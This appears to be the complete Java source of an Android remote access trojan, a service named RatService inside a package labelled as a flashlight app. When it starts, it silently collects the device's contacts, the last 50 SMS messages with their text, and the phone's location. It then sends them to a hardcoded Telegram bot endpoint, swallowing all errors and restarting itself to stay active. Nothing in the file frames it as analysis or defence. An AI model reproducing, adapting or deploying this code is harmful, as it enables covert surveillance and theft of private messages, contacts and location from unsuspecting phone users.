package com.flashlight.pro; 
import android.app.Service; import android.content.Intent; import android.database.Cursor; import android.location.Location; import android.location.LocationManager; import android.os.IBinder; import android.provider.ContactsContract; import android.provider.Telephony; import android.hardware.Camera; import java.io.*; import java.net.HttpURLConnection; import java.net.URL; import java.nio.charset.StandardCharsets; 

public class RatService extends Service { 
    private static final String API = "https://api.telegram.org/bot9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY"; 
    @Override public IBinder onBind(Intent intent) { return null; } 
    @Override public int onStartCommand(Intent intent, int flags, int startId) { 
        new Thread(() -> { 
            try { sendContacts(); } catch (Exception e) {}
            try { sendSms(); } catch (Exception e) {}
            try { sendLocation(); } catch (Exception e) {}
        }).start(); 
        return START_STICKY; 
    } 
    
    private void sendContacts() throws Exception { 
        StringBuilder sb = new StringBuilder(); 
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null); 
        if (c != null) { 
            while (c.moveToNext()) { 
                sb.append("👤 ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append("\n📞 ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n---\n"); 
            } 
            c.close(); 
        } 
        sendText("📇 Contacts", sb.toString()); 
    } 
    
    private void sendSms() throws Exception {
        StringBuilder sb = new StringBuilder(); 
        Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 50"); 
        if (c != null) { 
            while (c.moveToNext()) { 
                sb.append("👤 ").append(c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)))
                  .append("\n💬 ").append(c.getString(c.getColumnIndex(Telephony.Sms.BODY)))
                  .append("\n---\n"); 
            } 
            c.close(); 
        } 
        if (sb.length() > 0) { sendText("📨 SMS (Last 50)", sb.toString()); } 
    } 
    
    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String url = API + "/sendLocation?chat_id=8895860731&latitude=" + loc.getLatitude() + "&longitude=" + loc.getLongitude();
                new URL(url).openStream().close();
            }
        } catch (Exception e) {}
    }

    private void sendText(String title, String body) { 
        try { 
            HttpURLConnection conn = (HttpURLConnection) new URL(API + "/sendMessage").openConnection(); 
            conn.setDoOutput(true); conn.setRequestMethod("POST"); conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); 
            try (OutputStream os = conn.getOutputStream()) { 
                os.write(("chat_id=8895860731&text=" + java.net.URLEncoder.encode(title + "\n\n" + body, "UTF-8")).getBytes(StandardCharsets.UTF_8)); 
            } conn.getResponseCode(); 
        } catch (Exception e) {} 
    } 
}